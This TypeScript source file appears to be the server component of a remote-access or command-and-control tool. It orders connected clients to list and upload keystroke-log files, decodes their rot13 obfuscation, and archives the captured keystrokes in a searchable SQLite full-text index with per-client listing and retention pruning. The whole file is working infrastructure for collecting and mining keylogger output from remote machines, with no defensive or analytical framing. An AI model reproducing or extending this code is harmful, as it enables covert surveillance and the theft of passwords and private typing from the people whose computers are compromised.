import type { ServerWebSocket } from "bun";
import { db } from "../db/connection";
import { getConfig } from "../config";
import { logger } from "../logger";
import { encodeMessage } from "../protocol";
import type { SocketData } from "../sessions/types";
import { canUserAccessClient, getUsersWithInputArchiveEnabled } from "../users";

type KeylogFileMeta = {
  name: string;
  size: number;
  date: string;
  modifiedAt: number | null;
};

const pendingFileMeta = new Map<string, Map<string, KeylogFileMeta>>();
const MAX_RETRIEVES_PER_LIST = 25;

function rot13(str: string): string {
  return String(str || "").replace(/[a-zA-Z]/g, (char) => {
    const start = char <= "Z" ? 65 : 97;
    return String.fromCharCode(((char.charCodeAt(0) - start + 13) % 26) + start);
  });
}

function normalizeMeta(file: any): KeylogFileMeta | null {
  const name = typeof file?.name === "string" ? file.name.trim() : "";
  if (!name || name.includes("/") || name.includes("\\")) return null;
  const size = Math.max(0, Math.floor(Number(file?.size) || 0));
  const date = typeof file?.date === "string" ? file.date : "";
  const parsed = date ? Date.parse(date) : NaN;
  return {
    name,
    size,
    date,
    modifiedAt: Number.isFinite(parsed) ? parsed : null,
  };
}

function getPendingMeta(clientId: string, filename: string): KeylogFileMeta | null {
  return pendingFileMeta.get(clientId)?.get(filename) ?? null;
}

function shouldArchiveForClient(clientId: string): boolean {
  const config = getConfig().inputArchive;
  if (!config?.enabled) return false;
  const users = getUsersWithInputArchiveEnabled();
  return users.some((user) => canUserAccessClient(user.id, user.role, clientId));
}

function buildFtsQuery(query: string): string {
  return query
    .trim()
    .split(/\s+/)
    .map((term) => term.replace(/"/g, "").trim())
    .filter((term) => term.length >= 2)
    .map((term) => `"${term}"*`)
    .join(" ");
}

function rebuildArchiveFts(row: { id: number; client_id: string; filename: string; content: string }): void {
  try {
    db.prepare("DELETE FROM keylog_archive_fts WHERE rowid = ?").run(row.id);
    db.prepare(
      `INSERT INTO keylog_archive_fts(rowid, file_id, client_id, filename, content)
       VALUES (?, ?, ?, ?, ?)`,
    ).run(row.id, row.id, row.client_id, row.filename, row.content);
  } catch (err) {
    logger.warn(`[keylog-archive] failed to update FTS for ${row.client_id}/${row.filename}: ${(err as Error).message}`);
  }
}

export function archiveKeylogContent(clientId: string, filename: string, encodedContent: string, meta?: KeylogFileMeta | null): void {
  if (!shouldArchiveForClient(clientId)) return;
  const safeMeta = meta ?? getPendingMeta(clientId, filename);
  const decoded = rot13(String(encodedContent || ""));
  const now = Date.now();
  const size = safeMeta?.size ?? encodedContent.length;
  const modifiedAt = safeMeta?.modifiedAt ?? null;

  db.prepare(
    `INSERT INTO keylog_archive_files(client_id, filename, size, modified_at, retrieved_at, content)
     VALUES (?, ?, ?, ?, ?, ?)
     ON CONFLICT(client_id, filename) DO UPDATE SET
       size = excluded.size,
       modified_at = excluded.modified_at,
       retrieved_at = excluded.retrieved_at,
       content = excluded.content`,
  ).run(clientId, filename, size, modifiedAt, now, decoded);

  const row = db
    .prepare("SELECT id, client_id, filename, content FROM keylog_archive_files WHERE client_id = ? AND filename = ?")
    .get(clientId, filename) as { id: number; client_id: string; filename: string; content: string } | undefined;
  if (row) rebuildArchiveFts(row);
  pendingFileMeta.get(clientId)?.delete(filename);
}

export function handleKeylogArchiveMessage(clientId: string, payload: any, ws?: ServerWebSocket<SocketData>): void {
  if (!payload || typeof payload.type !== "string") return;
  if (!shouldArchiveForClient(clientId)) return;

  if (payload.type === "keylog_file_list") {
    const files = Array.isArray(payload.files) ? payload.files.map(normalizeMeta).filter(Boolean) as KeylogFileMeta[] : [];
    if (files.length === 0 || !ws) return;

    const maxFileBytes = getConfig().inputArchive.maxFileBytes;
    const existingRows = db
      .prepare("SELECT filename, size, modified_at as modifiedAt FROM keylog_archive_files WHERE client_id = ?")
      .all(clientId) as Array<{ filename: string; size: number; modifiedAt: number | null }>;
    const existing = new Map(existingRows.map((row) => [row.filename, row]));
    let pending = pendingFileMeta.get(clientId);
    if (!pending) {
      pending = new Map();
      pendingFileMeta.set(clientId, pending);
    }

    let requested = 0;
    for (const file of files) {
      if (file.size > maxFileBytes) continue;
      const old = existing.get(file.name);
      const changed = !old || old.size !== file.size || (file.modifiedAt !== null && old.modifiedAt !== file.modifiedAt);
      if (!changed || requested >= MAX_RETRIEVES_PER_LIST) continue;
      pending.set(file.name, file);
      try {
        ws.send(encodeMessage({
          type: "command",
          commandType: "keylog_retrieve",
          id: crypto.randomUUID(),
          payload: { filename: file.name },
        } as any));
        requested++;
      } catch (err) {
        logger.warn(`[keylog-archive] failed to request ${clientId}/${file.name}: ${(err as Error).message}`);
      }
    }
    return;
  }

  if (payload.type === "keylog_file_content" && typeof payload.filename === "string") {
    archiveKeylogContent(clientId, payload.filename, String(payload.content || ""));
  }
}

export function dispatchKeylogArchiveSync(clientId: string, ws: ServerWebSocket<SocketData>): boolean {
  if (!shouldArchiveForClient(clientId)) return false;
  try {
    ws.send(encodeMessage({
      type: "command",
      commandType: "keylog_list",
      id: crypto.randomUUID(),
    } as any));
    return true;
  } catch (err) {
    logger.warn(`[keylog-archive] failed to request file list for ${clientId}: ${(err as Error).message}`);
    return false;
  }
}

export function listArchivedKeylogs(clientId: string): Array<{ name: string; size: number; date: string; archived: true; retrievedAt: number }> {
  const rows = db
    .prepare(
      `SELECT filename, size, modified_at as modifiedAt, retrieved_at as retrievedAt
       FROM keylog_archive_files
       WHERE client_id = ?
       ORDER BY COALESCE(modified_at, retrieved_at) DESC, filename ASC`,
    )
    .all(clientId) as Array<{ filename: string; size: number; modifiedAt: number | null; retrievedAt: number }>;

  return rows.map((row) => ({
    name: row.filename,
    size: row.size,
    date: new Date(row.modifiedAt || row.retrievedAt).toISOString(),
    archived: true,
    retrievedAt: row.retrievedAt,
  }));
}

export function getArchivedKeylogContent(clientId: string, filename: string): { filename: string; content: string; archived: true } | null {
  const row = db
    .prepare("SELECT filename, content FROM keylog_archive_files WHERE client_id = ? AND filename = ?")
    .get(clientId, filename) as { filename: string; content: string } | undefined;
  if (!row) return null;
  return { filename: row.filename, content: rot13(row.content), archived: true };
}

export function searchArchivedKeylogs(clientId: string, query: string): Array<{ file: string; date: string; matches: Array<{ index: number; context: string; line: number }> }> {
  const trimmed = query.trim();
  if (trimmed.length < 3) return [];

  const ftsQuery = buildFtsQuery(trimmed);
  let rows: Array<{ filename: string; content: string; modifiedAt: number | null; retrievedAt: number }> = [];
  if (ftsQuery) {
    try {
      rows = db
        .prepare(
          `SELECT f.filename, f.content, f.modified_at as modifiedAt, f.retrieved_at as retrievedAt
           FROM keylog_archive_fts
           JOIN keylog_archive_files f ON f.id = keylog_archive_fts.file_id
           WHERE keylog_archive_fts.client_id = ? AND keylog_archive_fts MATCH ?
           ORDER BY COALESCE(f.modified_at, f.retrieved_at) DESC
           LIMIT 100`,
        )
        .all(clientId, ftsQuery) as any[];
    } catch {
      rows = [];
    }
  }

  if (rows.length === 0) {
    rows = db
      .prepare(
        `SELECT filename, content, modified_at as modifiedAt, retrieved_at as retrievedAt
         FROM keylog_archive_files
         WHERE client_id = ? AND lower(content) LIKE ?
         ORDER BY COALESCE(modified_at, retrieved_at) DESC
         LIMIT 100`,
      )
      .all(clientId, `%${trimmed.toLowerCase()}%`) as any[];
  }

  const lowerQuery = trimmed.toLowerCase();
  return rows
    .map((row) => {
      const content = String(row.content || "");
      const lowerContent = content.toLowerCase();
      const matches: Array<{ index: number; context: string; line: number }> = [];
      let index = 0;
      while ((index = lowerContent.indexOf(lowerQuery, index)) !== -1 && matches.length < 25) {
        const start = Math.max(0, index - 50);
        const end = Math.min(content.length, index + trimmed.length + 50);
        let context = content.substring(start, end);
        if (start > 0) context = `...${context}`;
        if (end < content.length) context = `${context}...`;
        matches.push({
          index,
          context,
          line: content.substring(0, index).split("\n").length,
        });
        index += trimmed.length;
      }
      return {
        file: row.filename,
        date: new Date(row.modifiedAt || row.retrievedAt).toISOString(),
        matches,
      };
    })
    .filter((result) => result.matches.length > 0);
}

export function pruneExpiredKeylogArchive(): number {
  const retentionDays = getConfig().inputArchive?.retentionDays ?? 7;
  const cutoff = Date.now() - retentionDays * 24 * 60 * 60 * 1000;
  const ids = db
    .prepare("SELECT id FROM keylog_archive_files WHERE retrieved_at < ? LIMIT 5000")
    .all(cutoff) as Array<{ id: number }>;
  if (ids.length === 0) return 0;

  const deleteFts = db.prepare("DELETE FROM keylog_archive_fts WHERE rowid = ?");
  const deleteFile = db.prepare("DELETE FROM keylog_archive_files WHERE id = ?");
  const tx = db.transaction((rows: Array<{ id: number }>) => {
    for (const row of rows) {
      deleteFts.run(row.id);
      deleteFile.run(row.id);
    }
  });
  tx(ids);
  return ids.length;
}
